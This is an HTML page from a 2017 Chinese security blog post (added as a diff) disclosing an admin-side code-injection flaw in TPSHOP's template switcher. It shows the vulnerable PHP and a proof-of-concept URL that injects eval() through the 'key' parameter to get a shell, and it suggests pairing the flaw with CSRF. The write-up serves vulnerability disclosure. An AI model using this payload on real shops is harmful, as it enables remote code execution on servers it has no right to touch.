@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="PHP,代码审计," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我找了个后台getshell，调了很久，终于调通了POC">
+<meta name="keywords" content="PHP,代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TPSHOP-GETSHELL">
+<meta property="og:url" content="http://aten8.net/2017/11/24/TPSHOP-GETSHELL/index.html">
+<meta property="og:site_name" content="两只狗">
+<meta property="og:description" content="最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我找了个后台getshell，调了很久，终于调通了POC">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-02-06T07:40:39.553Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TPSHOP-GETSHELL">
+<meta name="twitter:description" content="最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我找了个后台getshell，调了很久，终于调通了POC">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://aten8.net/2017/11/24/TPSHOP-GETSHELL/"/>
+
+
+
+
+
+  <title>TPSHOP-GETSHELL | 两只狗</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">两只狗</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-drops">
+          <a href="/drops/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            乌云知识库
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://aten8.net/2017/11/24/TPSHOP-GETSHELL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Kyrie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="两只狗">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TPSHOP-GETSHELL</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-24T13:59:47+08:00">
+                2017-11-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我找了个后台getshell，调了很久，终于调通了POC</p>
+<a id="more"></a>
+<p>最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我找了个后台getshell，调了很久，终于调通了POC</p>
+<p><a href="http://xxx/index.php/Admin/template/changeTemplate/key/&#39;.eval(&#39;echo" target="_blank" rel="external">http://xxx/index.php/Admin/template/changeTemplate/key/&#39;.eval(&#39;echo</a> 123;’).’/t/pc</p>
+<p>利用条件是需要登陆进入后台，触发点在后台的模板修改处，点击“启用”按钮就可以发送一个GET请求，把GET请求中的KEY参数改为’.eval(‘echo 123;’).’ 即可。。<br>或者是直接登陆进入后台，直接浏览器请求POC也行的</p>
+<p>漏洞触发点在  application/admin/controller/Template.php 中的changeTemplate方法中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">changeTemplate</span><span class="params">()</span></span>&#123;        </div><div class="line">        </div><div class="line">        $t = I(<span class="string">'t'</span>,<span class="string">'pc'</span>); <span class="comment">// pc or  mobile        </span></div><div class="line">        $m = ($t == <span class="string">'pc'</span>) ? <span class="string">'home'</span> : <span class="string">'mobile'</span>;</div><div class="line">        $key = <span class="keyword">$this</span>-&gt;request-&gt;param(<span class="string">'key'</span>);</div><div class="line">        <span class="comment">//$default_theme = tpCache("hidden.&#123;$t&#125;_default_theme"); // 获取原来的配置                </span></div><div class="line">        <span class="comment">//tpCache("hidden.&#123;$t&#125;_default_theme",$_GET['key']);</span></div><div class="line">        <span class="comment">//tpCache('hidden',array("&#123;$t&#125;_default_theme"=&gt;$_GET['key']));                         </span></div><div class="line">        <span class="comment">// 修改文件配置  </span></div><div class="line">         <span class="keyword">if</span>(!is_writeable(APP_PATH.<span class="string">"$m/html.php"</span>))</div><div class="line">            <span class="keyword">return</span> <span class="string">"文件/"</span>.APP_PATH.<span class="string">"$m/html.php不可写,不能启用魔板,请修改权限!!!"</span>;</div><div class="line">         </div><div class="line">                $config_html =<span class="string">"&lt;?php</span></div><div class="line"><span class="string">return [</span></div><div class="line"><span class="string">            'template'               =&gt; [</span></div><div class="line"><span class="string">            // 模板引擎类型 支持 php think 支持扩展</span></div><div class="line"><span class="string">            'type'         =&gt; 'Think',</span></div><div class="line"><span class="string">            // 模板路径</span></div><div class="line"><span class="string">            'view_path'    =&gt; './template/$t/$key/',</span></div><div class="line"><span class="string">            // 模板后缀</span></div><div class="line"><span class="string">            'view_suffix'  =&gt; 'html',</span></div><div class="line"><span class="string">            // 模板文件名分隔符</span></div><div class="line"><span class="string">            'view_depr'    =&gt; DS,</span></div><div class="line"><span class="string">            // 模板引擎普通标签开始标记</span></div><div class="line"><span class="string">            'tpl_begin'    =&gt; '&#123;',</span></div><div class="line"><span class="string">            // 模板引擎普通标签结束标记</span></div><div class="line"><span class="string">            'tpl_end'      =&gt; '&#125;',</span></div><div class="line"><span class="string">            // 标签库标签开始标记</span></div><div class="line"><span class="string">            'taglib_begin' =&gt; '&lt;',</span></div><div class="line"><span class="string">            // 标签库标签结束标记</span></div><div class="line"><span class="string">            'taglib_end'   =&gt; '&gt;',</span></div><div class="line"><span class="string">            //模板文件名</span></div><div class="line"><span class="string">            'default_theme'     =&gt; '$key',</span></div><div class="line"><span class="string">        ],</span></div><div class="line"><span class="string">        'view_replace_str'  =&gt;  [</span></div><div class="line"><span class="string">            '__PUBLIC__'=&gt;'/public',</span></div><div class="line"><span class="string">            '__STATIC__' =&gt; '/template/$t/$key/static',</span></div><div class="line"><span class="string">            '__ROOT__'=&gt;''</span></div><div class="line"><span class="string">        ]</span></div><div class="line"><span class="string">    ];</span></div><div class="line"><span class="string">?&gt;"</span>;</div><div class="line">         file_put_contents(APP_PATH.<span class="string">"/$m/html.php"</span>, $config_html);</div><div class="line">        delFile(<span class="string">'./runtime'</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;success(<span class="string">"操作成功!!!"</span>,U(<span class="string">'admin/template/templateList'</span>,<span class="keyword">array</span>(<span class="string">'t'</span>=&gt;$t)));      </div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>其中$t 和 $key可控，咱们只需要让$key = ‘.eval(‘echo 123;’).’即可<br>但是直接访问html.php是403的<br>然后由于config.php包含了html.php，index.php包含了config.php，所以直接访问修改后直接访问index.php即可getshell</p>
+<p>这个洞是后台getshell，有点鸡肋，如果配合CSRF的话那么威力还是有的（萌新也只能挖个后台getshell了）</p>
+<p>感谢@碧波 大神帮忙调通了POC。。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Kyrie
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://aten8.net/2017/11/24/TPSHOP-GETSHELL/" title="TPSHOP-GETSHELL">http://aten8.net/2017/11/24/TPSHOP-GETSHELL/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/12/msf下生成各种payload的命令/" rel="next" title="msf下生成各种payload的命令">
+                <i class="fa fa-chevron-left"></i> msf下生成各种payload的命令
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/28/SQL注入环境/" rel="prev" title="SQL注入环境">
+                SQL注入环境 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Kyrie" />
+          <p class="site-author-name" itemprop="name">Kyrie</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://jimmy.wiki/wordpress" title="Jimmy" target="_blank">Jimmy</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.jiushao.net/" title="Jiushao" target="_blank">Jiushao</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.masker.top/" title="Masker" target="_blank">Masker</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Kyrie</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
